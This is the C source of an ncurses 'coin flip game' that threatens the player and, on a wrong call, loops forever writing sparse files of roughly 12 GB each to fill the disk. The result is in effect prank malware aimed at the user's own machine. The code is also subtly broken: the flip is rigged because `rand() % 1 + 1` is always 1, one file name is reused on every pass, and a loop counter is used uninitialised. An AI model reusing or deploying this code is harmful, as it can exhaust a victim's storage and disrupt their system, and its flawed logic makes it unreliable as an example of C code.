#include <stdio.h>
#include <limits.h>
#include <ncurses.h>
#include <unistd.h>
#include <time.h>
#include <stdlib.h>

int main(void) {
    int num = INT_MAX;
    int n = 1;
    char name[2] = {n};
    char input;
    int side;
    int random;
    FILE *fptr;
    WINDOW *disp, *ani;

    initscr();
    raw();
    noecho();
    curs_set(0);
    refresh();

    disp = newwin(1, 100, 3, 0);
    ani = newwin(1, 1, 1, 0);

    mvwprintw(disp, 0, 0, "I wanna play a little game");
    wrefresh(disp);

    sleep(2);

    wclear(disp);
    mvwprintw(disp, 0, 0, "You will call heads or tails and I will simulate a coin flip");
    wrefresh(disp);

    sleep(2);

    wclear(disp);
    mvwprintw(disp, 0, 0, "If you are right, you can exit out the program and go about your day");
    wrefresh(disp);

    sleep(2);

    wclear(disp);
    mvwprintw(disp, 0, 0, "But if you are wrong, this program will recusively create 10 GB files at a breakneck pace");
    wrefresh(disp);

    sleep(2);

    wclear(disp);
    mvwprintw(disp, 0, 0, "Call the side by typing an h for heads, and a t for tails, good luck");
    wrefresh(disp);
    
    sleep(2);

    wclear(disp);
    mvwprintw(disp, 0, 0, "3..");
    wrefresh(disp);
    sleep(1);
    wclear(disp);
    mvwprintw(disp, 0, 0, "2..");
    wrefresh(disp);
    sleep(1);
    wclear(disp);
    mvwprintw(disp, 0, 0, "1..");
    wrefresh(disp);
    sleep(1);
    wclear(disp);
    mvwprintw(disp, 0, 0, "CALL IT!");
    wrefresh(disp);

    input = getch();

    switch (input) {
        case 104:
        side = 1;
        wclear(disp);
        mvwprintw(disp, 0, 0, "You've chosen heads");
        wrefresh(disp);
        break;

        case 116:
        side = 0;
        wclear(disp);
        mvwprintw(disp, 0, 0, "You've chosen tails");
        wrefresh(disp);
        break;

        default:
        side = 2;
        wclear(disp);
        mvwprintw(disp, 0, 0, "Well, should've looked at your keyboard more, my condolences");
        wrefresh(disp);
        break;
    }

    srand(time(NULL));
    random = (rand() % 1) + 1;
    wclear(ani);
    mvwprintw(ani, 0, 0, "H");
    wrefresh(ani);
    random = (rand() % 1) + 1;
    wclear(ani);
    mvwprintw(ani, 0, 0, "T");
    wrefresh(ani);
    random = (rand() % 1) + 1;
    wclear(ani);
    mvwprintw(ani, 0, 0, "H");
    wrefresh(ani);
    random = (rand() % 1) + 1;
    wclear(ani);
    mvwprintw(ani, 0, 0, "T");
    wrefresh(ani);
    random = (rand() % 1) + 1;
    wclear(ani);
    mvwprintw(ani, 0, 0, "H");
    wrefresh(ani);
    random = (rand() % 1) + 1;
    wclear(ani);
    mvwprintw(ani, 0, 0, "T");
    wrefresh(ani);
    random = (rand() % 1) + 1;
    wclear(ani);
    mvwprintw(ani, 0, 0, "H");
    wrefresh(ani);

    switch (random) {
        case 1:
        wclear(ani);
        mvwprintw(ani, 0, 0, "H");
        wrefresh(ani);
        break;

        case 0:
        wclear(ani);
        mvwprintw(ani, 0, 0, "T");
        wrefresh(ani);
        break;
    }

    if (random == side) {
        wclear(disp);
        mvwprintw(disp, 0, 0, "Congrats, your PC is safe!\n");
        wrefresh(disp);
        sleep(2);
    }
    else if (random != side) {
        wclear(disp);
        mvwprintw(disp, 0, 0, "Better have task manager open\n");
        wrefresh(disp);
        int i;
        while (n != 0) {
            fptr = fopen(name, "w");
            while (i <= 5) {
                fseek(fptr, num, SEEK_CUR);
                i++;
            }
            fputc('\0', fptr);
            fclose(fptr);
            i = 0;
            n++;
        }
    }
    delwin(disp);
    delwin(ani);
    endwin();
    return 0;
}